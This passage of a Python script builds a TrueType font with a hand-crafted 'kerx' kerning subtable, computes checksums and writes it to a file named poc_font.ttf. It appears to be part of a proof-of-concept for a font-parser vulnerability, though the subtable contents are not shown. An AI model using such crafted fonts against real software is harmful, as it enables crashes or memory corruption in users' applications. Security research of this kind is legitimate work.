    # KerxSubTableHeader: 12 bytes
    # StateTable: variable
    # kernAction offset (HBUINT32): 4 bytes
    
    subtable_header_size = 12
    machine_offset = subtable_header_size  # StateTable starts after header
    
    # kernAction offset is from the beginning of the state machine
    # It points to the kernAction data which is after the state table
    kern_action_offset_from_machine = len(state_table)
    
    subtable_data = b''
    # We'll fill length later
    subtable_data += struct.pack('>I', 0)  # length placeholder
    subtable_data += struct.pack('>I', coverage)  # coverage
    subtable_data += struct.pack('>I', tupleCount)  # tupleCount
    subtable_data += state_table
    subtable_data += struct.pack('>I', kern_action_offset_from_machine)  # kernAction offset
    subtable_data += kern_action_data
    
    # Update length
    total_subtable_len = len(subtable_data)
    subtable_data = struct.pack('>I', total_subtable_len) + subtable_data[4:]
    
    kerx_data += subtable_data
    
    tables['kerx'] = kerx_data
    
    # Build the font file
    # Offset table
    num_tables = len(tables)
    # Calculate searchRange, entrySelector, rangeShift
    entry_selector = 0
    while (1 << (entry_selector + 1)) <= num_tables:
        entry_selector += 1
    search_range = (1 << entry_selector) * 16
    range_shift = num_tables * 16 - search_range
    
    font_data = struct.pack('>I', 0x00010000)  # sfVersion (TrueType)
    font_data += struct.pack('>H', num_tables)
    font_data += struct.pack('>H', search_range)
    font_data += struct.pack('>H', entry_selector)
    font_data += struct.pack('>H', range_shift)
    
    # Table directory
    table_dir = b''
    table_data = b''
    for tag in sorted(tables.keys()):
        data = tables[tag]
        # Pad to 4 bytes
        padding = (4 - len(data) % 4) % 4
        data += b'\x00' * padding
        
        # Calculate checksum
        checksum = sum(struct.unpack('>I', data[i:i+4])[0] for i in range(0, len(data), 4))
        checksum &= 0xFFFFFFFF
        
        table_dir += tag.encode('ascii')
        table_dir += struct.pack('>I', checksum)
        table_dir += struct.pack('>I', 12 + num_tables * 16 + len(table_data))  # offset
        table_dir += struct.pack('>I', len(data))
        table_data += data
    
    font_data += table_dir
    font_data += table_data
    
    # Fix head checkSumAdjustment
    # Calculate checksum of entire font
    total_checksum = 0
    for i in range(0, len(font_data), 4):
        chunk = font_data[i:i+4]
        if len(chunk) < 4:
            chunk += b'\x00' * (4 - len(chunk))
        total_checksum += struct.unpack('>I', chunk)[0]
        total_checksum &= 0xFFFFFFFF
    
    # The checkSumAdjustment in head should be 0xB1B0AFBA - total_checksum
    # But we need to find where head table is in the font
    # Actually, let's just write the font and fix it later
    
    with open('/workspace/poc_font.ttf', 'wb') as f:
        f.write(font_data)
    
    print(f"Font size: {len(font_data)}")
    print(f"kerx table size: {len(kerx_data)}")
    print(f"kerx data hex: {kerx_data.hex()}")
    
    # Let's also check the head table offset
    head_offset = None
    for i in range(num_tables):
        tag_offset = 12 + i * 16
        tag = font_data[tag_offset:tag_offset+4].decode('ascii')
        if tag == 'head':
            head_offset = struct.unpack('>I', font_data[tag_offset+8:tag_offset+12])[0]
            break
    
    print(f"head table at offset: {head_offset}")
    if head_offset is not None:
        # Set checkSumAdjustment to 0 first
        # head checkSumAdjustment is at offset 8
        font_data_list = bytearray(font_data)
        # Set checkSumAdjustment to 0
        struct.pack_into('>I', font_data_list, head_offset + 8, 0)
        
        # Recalculate total checksum
        total = 0
        for i in range(0, len(font_data_list), 4):
            chunk = bytes(font_data_list[i:i+4])
            if len(chunk) < 4:
                chunk += b'\x00' * (4 - len(chunk))
            total += struct.unpack('>I', chunk)[0]
            total &= 0xFFFFFFFF
        
        check_sum = (0xB1B0AFBA - total) & 0xFFFFFFFF
        struct.pack_into('>I', font_data_list, head_offset + 8, check_sum)
        
        with open('/workspace/poc_font.ttf', 'wb') as f:
            f.write(bytes(font_data_list))
        
        print(f"Fixed checkSumAdjustment: 0x{check_sum:08X}")

